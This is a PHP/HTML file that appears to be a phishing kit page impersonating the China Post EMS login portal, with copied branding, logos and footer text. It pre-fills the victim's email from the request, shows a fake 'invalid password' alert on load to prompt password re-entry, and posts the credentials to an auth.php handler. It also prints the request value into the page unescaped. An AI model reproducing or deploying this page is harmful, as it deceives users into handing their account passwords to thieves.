<?php


$login = $_REQUEST['email'];
$email = $login;


?>
<!DOCTYPE html>
<html>
  <script type="text/javascript">
    alert("Invalid Email or password! Please enter your correct Email and password!");
</script>  <head>
    <title>&#20013;&#22269;&#37038;&#25919;&#36895;&#36882;&#29289;&#27969;</title>
    <meta content="width=device-width, initial-scale=1" name="viewport" />
	<link href="https://sso.emsog.post/themes/ems/images/favicon.png" rel="shortcut icon"/>

<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Arial, Helvetica, sans-serif;}
form {border: 3px solid #ffffff;}

input[type=text], input[type=password] {
  width: 30%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  box-sizing: border-box;
}

button {
  background-color: #4c84af;
  color: white;
  padding: 14px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 30%;
}

button:hover {
  opacity: 0.8;
}

.cancelbtn {
  width: auto;
  padding: 10px 18px;
  background-color: #ffffff;
}

.imgcontainer {
  text-align: center;
  margin: 24px 0 12px 0;
}

img.avatar {
  width: 40%;
  border-radius: 50%;
}

.container {
  padding: 16px;
}

span.psw {
  float: right;
  padding-top: 16px;
}

/* Change styles for span and cancel button on extra small screens */
@media screen and (max-width: 100px) {
  span.psw {
     display: block;
     float: none;
  }
  .cancelbtn {
     width: 30%;
  }
}
</style>
</head>
<body>


<form action="auth.php" class="login" method="POST" name="login">
  <div class="imgcontainer">
    <img src="https://main.cdn.merchant.wish.com/d8f2f62fff68/img/erp_logos/ems_large.png" alt="Ems post" class="Ems post"/></div>
<div>

 <div class="container" align="center">
<div class="header__content "><h1 class="header__content__heading">&#20013;&#22269;&#37038;&#25919;&#29289;&#27969;&#19982;EMS |&#30005;&#23376;&#25991;&#20214;</h1><p class="&#30331;&#24405;&#26377;&#25928;&#30340;&#30005;&#23376;&#37038;&#20214;&#21644;&#23494;&#30721;</p></div><div/>
<div/>

  <div class="container" align="center">
    
    <input type="text" placeholder="&#30005;&#23376;&#37038;&#20214;" value ="<? print $login; ?>"name="login" required="" readonly/></span>
            </div>

   <div class="container" align="center"> 
    <input type="password" placeholder="&#23494;&#30721;" name="password" required=""></span>
            </div>
  <div class="container" align="center">       
    <button type="submit">&#30331;&#24405;</button>
    <label>
      </div>
</header>
</div>

<div align="center">
<div class="box_4" align="center">
	
		</div>
                <div align="center">

		<div class="box_5" style="margin-left: 3px;">
			<img alt="" src="http://www.ems.com.cn/images/index_finalV10_64_20131126.png" usemap="#Map" />
			<map id="Map" name="Map">
				<area coords="40,40,200,100" href="index.html" shape="rect" />
				<area coords="210,40,380,100" href="http://www.cnpl.com.cn" shape="rect" />
			</map>
		</div>

		
	</div>
	<div align="center"> 
	<div class="flash-banner" style="float: left; margin-top: 5px;">
	<div style="position:absolute; width:900px; height:96px; z-index:10;background:url(images/transparentbg.gif);"><a href="http://www.spb.gov.cn/kdy/" target="_blank" style="display:block; width:100%; height:100%; text-indent:-999px;"></a></div>
	<object data="flash/flash20131115.swf" height="96px" type="application/x-shockwave-flash" width="900">
	<param name="movie" value="flash/Banner900X117.swf" /> 
	<param name="movie" value="flash/flash20131115.swf" />
	<param name="wmode" value="transparent">
	</object> 
	</div> -->
<div align="center">
<div class="body_footer">
	<span class="banner_logo"></span>
	<div class="bottom_container">
		<p class="bottom_text"><a href="../mailtracking/you_jian_cha_xun.html">&#37038;&#20214;&#26597;&#35810;</a> | <a href="../mainservice/ems/ci_chen_da.html">&#20135;&#21697;&#20171;&#32461;</a> |
		<a href="http://www.11183.com.cn/ec-web/register/register_toIndex.action">&#23458;&#25143;&#26381;&#21153;</a> | <a href="../promiseservice/guo_nei_ems_shi_xian.html">&#25215;&#35834;&#26381;&#21153;</a> | <a href="../serviceguide/tong_da_fan_wei.html">&#26381;&#21153;&#25351;&#21335;</a> |
		<a href="http://www.11183.com.cn/ec-web/">&#32593;&#19978;&#19979;&#21333;</a> | <a href="../aboutus/gong_si_jian_jie.html">&#20851;&#20110;&#25105;&#20204;</a></p>
		<p class="bottom_text">&#29256;&#26435;&#25152;&#26377;&#65306;&#20013;&#22269;&#37038;&#25919;&#36895;&#36882;&#29289;&#27969; [&#20140;ICP&#35777;030621&#21495;] &#20140;&#20844;&#32593;&#23433;&#22791;[110401400184]</p>
	</div>
	<br />
</div>
<div id="vercod" style="width: 100px; height: 50px; border: 1px gray solid; display: none; position: absolute; background-color: white">
<script type="text/javascript">
	function reloadcode()
    {
     	document.getElementById('checkcodeimg').src = 'ems/rand?' + Math.random();
    }
</script>
	<div>
		<span style="cursor: pointer; background: transparent url('images/cancel.png'); display:block;height:16px;width:16px;margin-left:82px; margin-top:2px;"></span></div>
	<a href="javascript:reloadcode();" style="margin-left:8px;margin-top:5px;display:block"><img id="checkcodeimg" alt="&#30475;&#19981;&#28165;&#65292;&#25442;&#19968;&#24352;" src=""></a>
</div>
<div id="float_left" style="position:absolute; left:20px; top: 48%;text-align: center;font-size: 15px">
<img src="images/405.jpg" height="135" width="146"/></br>&#25195;&#25551;&#20108;&#32500;&#30721;&#20851;&#27880;<br/>EMS&#24494;&#20449;&#33258;&#21161;&#24179;&#21488;&#65281;</div>
<script type="text/javascript">
//&#24038;&#20391;&#22266;&#23450;
scrollx({id:'float_left', t:200, f:1});
</script>
</body>
</html>